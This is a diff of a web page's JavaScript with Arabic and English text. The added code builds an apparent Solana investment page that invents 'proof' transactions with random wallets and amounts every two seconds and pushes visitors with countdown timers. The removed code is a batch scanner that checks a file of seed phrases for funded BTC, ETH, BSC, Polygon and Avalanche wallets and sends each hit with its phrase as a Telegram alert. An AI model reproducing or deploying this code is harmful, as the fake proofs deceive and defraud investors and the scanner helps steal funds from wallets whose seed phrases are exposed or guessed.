+  function randomWallet() {
+    const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890';
+    let wallet = '';
+    for (let i = 0; i < 10; i++) wallet += chars.charAt(Math.floor(Math.random()*chars.length));
+    return '...' + wallet;
+  }
+
+  // Generates a random amount between 1000 and 12000 SOL
+  function randomAmount() {
+    return '+' + (Math.floor(Math.random() * 11000) + 1000) + ' SOL';
+  }
+
+  // Generates a random "time ago" string based on current language
+  function randomAgo() {
+    if (currentLanguage === 'ar') {
+      const arTimes = ['الآن', 'قبل دقيقة', 'قبل 4 دقائق', 'قبل 7 دقائق', 'قبل 20 دقيقة', 'قبل ساعة'];
+      return arTimes[Math.floor(Math.random()*arTimes.length)];
+    } else {
+      const enTimes = ['now', '1 min ago', '4 min ago', '7 min ago', '20 min ago', '1 hour ago'];
+      return enTimes[Math.floor(Math.random()*enTimes.length)];
+    }
+  }
+
+  // Injects a single new fake proof transaction at the top of the list
+  function injectFakeProof() {
+    const proofsList = document.getElementById('proofs-list');
+    if (!proofsList) return; // Exit if the element doesn't exist
+
+    const proofCard = document.createElement('div');
+    proofCard.className = 'proof-card';
+    proofCard.innerHTML =
+      `<span class="proof-amount">${randomAmount()}</span>
+       <span class="proof-wallet">${randomWallet()}</span>
+       <span>${randomAgo()}</span>`;
+    
+    // Insert at the top of the list
+    if (proofsList.firstChild) {
+      proofsList.insertBefore(proofCard, proofsList.firstChild);
+      // Keep only the latest 6 transactions (automatically removes oldest)
+      while (proofsList.childNodes.length > 6) {
+        proofsList.removeChild(proofsList.lastChild);
+      }
+    } else {
+      proofsList.appendChild(proofCard);
+    }
+  }
+
+  // Function to show wallet details and start the 24-hour investment timer
+  function showWallet() {
+    var amount = parseFloat(document.getElementById('sol-amount').value) || 0;
+    // Minimum investment check
+    if (amount < 1) {
+      showMessageBox(translations[currentLanguage]['min-investment-alert']);
+      return;
+    }
+    document.getElementById('wallet-section').style.display = 'block';
+    startInvestmentTimer(); // Start the actual 24-hour investment countdown
+    // Scroll to the wallet section for better UX
+    document.getElementById('wallet-section').scrollIntoView({behavior:"smooth"});
+  }
+
+  // Function to create and show a custom message box instead of alert
+  function showMessageBox(message) {
+    const overlay = document.createElement('div');
+    overlay.classList.add('message-box-overlay');
+    
+    const messageBox = document.createElement('div');
+    messageBox.classList.add('message-box');
+
+    const messageText = document.createElement('p');
+    messageText.innerText = message;
+    messageText.style.marginBottom = '15px';
+
+    const closeButton = document.createElement('button');
+    closeButton.innerText = (currentLanguage === 'ar') ? 'موافق' : 'OK';
+    closeButton.onclick = () => document.body.removeChild(overlay);
+
+    messageBox.appendChild(messageText);
+    messageBox.appendChild(closeButton);
+    overlay.appendChild(messageBox);
+    document.body.appendChild(overlay);
+  }
+
+  // Initialize on page load
+  document.addEventListener('DOMContentLoaded', function() {
+    setLanguage(currentLanguage); // Set initial language
+    
+    // Initial fill for fake proofs and start interval
+    // Clear initial static proofs to allow dynamic injection to populate
+    const proofsList = document.getElementById('proofs-list');
+    if (proofsList) {
+        proofsList.innerHTML = ''; // Clear existing static proofs
+        for (let i = 0; i < 4; i++) {
+            injectFakeProof();
         }
-
-        // API Wrapper with Rate-Limit Detection
-        async function checkApi(url) {
-          const res = await fetch(url);
-          if (res.status === 429) throw new Error('rate_limit');
-          return res.json();
-        }
-
-        // Balance-Check Functions
-        async function checkBtc(addr) {
-          try {
-            const data = await checkApi(`https://blockstream.info/api/address/${addr}`);
-            return (data.chain_stats.funded_txo_sum - data.chain_stats.spent_txo_sum) > 0;
-          } catch (error) {
-            // If the address is not found or other API error, assume 0 balance unless it's a rate_limit
-            if (error.message === 'rate_limit') throw error; // Re-throw rate_limit error
-            console.warn(`BTC check for ${addr} failed or returned no data:`, error);
-            return false;
-          }
-        }
-
-        async function checkEvm(addr, apiKey, apiUrl) {
-          if (!apiKey) return false;
-          try {
-            const json = await checkApi(`${apiUrl}?module=account&action=balance&address=${addr}&tag=latest&apikey=${apiKey}`);
-            // Check for a valid result and ensure it's a positive number
-            if (json && typeof json.result === 'string' && parseFloat(json.result) > 0) {
-              return true;
-            }
-            return false;
-          } catch (error) {
-            if (error.message === 'rate_limit') throw error; // Re-throw rate_limit error
-            console.warn(`EVM check for ${addr} on ${apiUrl} failed:`, error);
-            return false;
-          }
-        }
-
-        // Address Derivation
-        function deriveBtc(seed) {
-          const root = hdkey.fromMasterSeed(seed);
-          const child = root.derive("m/44'/0'/0'/0/0");
-          return bitcoin.payments.p2pkh({ pubkey: child.publicKey }).address;
-        }
-
-        function deriveEvm(seed) {
-          const root = hdkey.fromMasterSeed(seed);
-          const child = root.derive("m/44'/60'/0'/0/0");
-          return '0x' + ethereumjs.Util.pubToAddress(child.publicKey, true).toString('hex');
-        }
-
-        // Single-Phrase Scan Logic
-        async function scanPhrase(phrase) {
-          // Validate mnemonic phrase
-          if (!bip39.validateMnemonic(phrase)) return { ok:false };
-
-          // Derive seed
-          const seed = await bip39.mnemonicToSeed(phrase);
-
-          // Derive addresses
-          const btcAddr = deriveBtc(seed);
-          const evmAddr = deriveEvm(seed);
-
-          // Check balances across different chains
-          if (await checkBtc(btcAddr)) return { ok:true, chain:'BTC', addr:btcAddr };
-          if (await checkEvm(evmAddr, document.getElementById('etherscanKey').value.trim(), 'https://api.etherscan.io/api'))
-            return { ok:true, chain:'ETH', addr:evmAddr };
-          if (await checkEvm(evmAddr, document.getElementById('bscscanKey').value.trim(), 'https://api.bscscan.com/api'))
-            return { ok:true, chain:'BSC', addr:evmAddr };
-          if (await checkEvm(evmAddr, document.getElementById('polygonKey').value.trim(), 'https://api.polygonscan.io/api')) /* Corrected Polygonscan API URL */
-            return { ok:true, chain:'POLY', addr:evmAddr };
-          if (await checkEvm(evmAddr, document.getElementById('snowtraceKey').value.trim(), 'https://api.snowtrace.io/api'))
-            return { ok:true, chain:'AVAX', addr:evmAddr };
-          
-          return { ok:false }; // No funds found
-        }
-
-        // Batch File Scan & UI Updates
-        async function scanFile() {
-          const file = document.getElementById('fileInput').files[0];
-          // Simple validation for file input
-          if (!file) {
-            // Using a custom message box instead of alert()
-            const messageBox = document.createElement('div');
-            messageBox.style.cssText = `
-                position: fixed;
-                top: 50%;
-                left: 50%;
-                transform: translate(-50%, -50%);
-                background-color: #222;
-                color: #ff3333;
-                border: 2px solid #ff3333;
-                padding: 20px;
-                border-radius: 8px;
-                box-shadow: 0 0 20px rgba(255, 51, 51, 0.7);
-                z-index: 1000;
-                font-family: 'Source Code Pro', monospace;
-                text-align: center;
-            `;
-            messageBox.innerHTML = `
-                <p>يرجى رفع ملف العبارات أولاً</p>
-                <button style="background-color: #ff3333; color: #000; border: none; padding: 10px 15px; border-radius: 5px; margin-top: 15px; cursor: pointer;" onclick="this.parentNode.remove()">موافق</button>
-            `;
-            document.body.appendChild(messageBox);
-            return;
-          }
-
-          // Read file content
-          const lines = (await new Promise(r => {
-            const fr = new FileReader();
-            fr.onload = e => r(e.target.result.trim().split(/\r?\n/).filter(l=>l.trim()));
-            fr.readAsText(file, 'UTF-8');
-          }));
-
-          const total = lines.length;
-          const resultsDiv = document.getElementById('results');
-          resultsDiv.innerHTML = ''; // Clear previous results
-          
-          let good = 0;
-          let bad = 0;
-          let stopped = false;
-          const gunshotAudio = document.getElementById('gunshot');
-
-          for (let i = 0; i < total && !stopped; i++) {
-            // Update summary progress
-            document.getElementById('summary').innerHTML = `🚀 تم فحص <span class="count">${i + 1}/${total}</span> عبارة`;
-            
-            try {
-              const res = await scanPhrase(lines[i]);
-              if (res.ok) {
-                good++;
-                resultsDiv.innerHTML += `<div class="good">✅ [${res.chain}] ${lines[i]} → ${res.addr}</div>`;
-                // Play gunshot sound
-                gunshotAudio.currentTime = 0; // Rewind to start in case it's still playing
-                gunshotAudio.play().catch(e => console.error("Error playing gunshot sound:", e));
-                // Send Telegram alert
-                sendTelegramAlert(`Found ${res.chain} wallet:\nPhrase: ${lines[i]}\nAddress: ${res.addr}`);
-              } else {
-                bad++;
-                resultsDiv.innerHTML += `<div class="bad">❌ ${lines[i]}</div>`;
-              }
-            } catch (err) {
-              if (err.message === 'rate_limit') {
-                stopped = true;
-                resultsDiv.innerHTML += `<div class="limit">⚠️ تم الوصول للحد الأقصى لطلبات API، توقف الفحص.</div>`;
-                console.warn('API rate limit reached. Scanning stopped.');
-              } else {
-                resultsDiv.innerHTML += `<div class="bad">❌ ${lines[i]} (خطأ: ${err.message || 'غير معروف'})</div>`;
-                console.error(`Error scanning phrase ${lines[i]}:`, err);
-                bad++; // Count as bad if an unexpected error occurs
-              }
-            }
-            // Scroll to the bottom of the results div to show latest entries
-            resultsDiv.scrollTop = resultsDiv.scrollHeight;
-          }
-
-          // Final summary update
-          document.getElementById('summary').innerHTML = `
-            <br>
-            <span class="good">عبارات صالحة: ${good}</span> | 
-            <span class="bad">عبارات غير صالحة: ${bad}</span>
-          `;
-          if (stopped) {
-            document.getElementById('summary').innerHTML += `<br><span class="limit">توقف الفحص بسبب تجاوز الحد الأقصى لطلبات API.</span>`;
-          }
-        }
-    </script>
+        setInterval(injectFakeProof, 2000); // Add a new transaction every 2 seconds
+    }
+    
+    // Start the 2-hour offer timer automatically on page load
+    startOfferTimer();
+  });
+</script>
 </body>
 </html>
-
